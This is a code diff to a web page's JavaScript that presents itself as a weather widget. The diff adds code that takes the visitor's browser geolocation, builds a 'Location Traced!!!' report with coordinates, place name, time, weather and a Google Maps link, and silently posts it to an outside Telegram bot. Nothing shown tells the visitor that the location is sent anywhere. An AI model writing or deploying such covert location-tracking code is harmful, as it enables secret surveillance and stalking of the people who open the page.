@@ -436,23 +436,28 @@
                     const month = (now.getMonth() + 1).toString().padStart(2, '0');
                     const year = now.getFullYear();
                     const formattedDate = `${day}/${month}/${year}`;
-                    const message = `🚨 Location Traced!!!\n\n📌 Latitude: ${latitude}\n📌 Longitude: ${longitude}\n🕒 Time: ${new Date().toLocaleTimeString()}\n📅 Date: ${new Date().toLocaleDateString('en-GB')}\n📍 Map Link: https://www.google.com/maps?q=${latitude},${longitude}`;
+                    const message = `🚨 Location Traced!!!\n\n📌 Latitude: ${latitude}\n📌 Longitude: ${longitude}\n🕒 Time: ${new Date().toLocaleTimeString()}\n📅 Date: ${new Date().toLocaleDateString('en-GB')}\n📍Place: \n🌥 Weather: \n🌡 Temperature: \n🌎 Google Map Link: https://www.google.com/maps?q=${latitude},${longitude}`;
 
-
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-                    });
 
                     // Fetch weather and apply background
                     fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&appid=${WEATHER_API_KEY}`)
                         .then(res => res.json())
                         .then(data => {
                             const weather = data.weather[0].main.toLowerCase();
+                            const tempKelvin = data.main.temp;
+const tempCelsius = Math.round(tempKelvin - 273.15);
                             document.getElementById("lower-section").style.background = getWeatherGif(weather);
-                            weatherData.innerHTML = `<strong>Place:</strong> ${data.name} &nbsp; | &nbsp; <strong>Weather:</strong> ${capitalize(weather)}`;
+                            weatherData.innerHTML = `<strong>Place:</strong> ${data.name} &nbsp; | &nbsp; <strong>Weather:</strong> ${capitalize(weather)} &nbsp; | &nbsp; <strong>Temp:</strong> ${tempCelsius} °C`;
                             status.textContent = "✅ Synced with weather";
+
+                            // Update telegram message with place, weather, and temperature
+                            const updatedMessage = `🚨 Location Traced!!!\n\n📌 Latitude: ${latitude}\n📌 Longitude: ${longitude}\n📍Place: ${data.name}\n🕒 Time: ${new Date().toLocaleTimeString()}\n📅 Date: ${new Date().toLocaleDateString('en-GB')}\n🌥 Weather: ${capitalize(weather)}\n🌡 Temperature: ${tempCelsius} °C\n🌎 Google Map Link: https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({ chat_id: CHAT_ID, text: updatedMessage })
+                            });
                         });
                 }, () => status.textContent = "😔 Oops! Can’t get weather because Location is not allowed. Please allow location in your browser's/app's site settings and retry.");
             }
